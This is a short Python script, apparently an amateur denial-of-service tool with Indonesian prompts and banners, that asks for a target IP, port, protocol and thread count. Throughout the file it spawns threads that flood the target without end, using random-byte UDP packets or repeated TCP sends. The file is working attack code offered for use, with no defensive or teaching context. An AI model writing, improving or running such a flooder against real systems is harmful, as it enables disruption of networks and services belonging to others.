#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print ("DDOS By vans.Qc")
print ("TOOLS hanya khusus untuk evans")
print ("bismillah dulu ajee!!!")
ip = str(input(" Tujuan Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(2204)
	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET BANG DARI EVANS!!! TOK TOK TOK!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(1024)
	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET BANG DARI EVANS!!! TOK TOK TOK!!!!")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
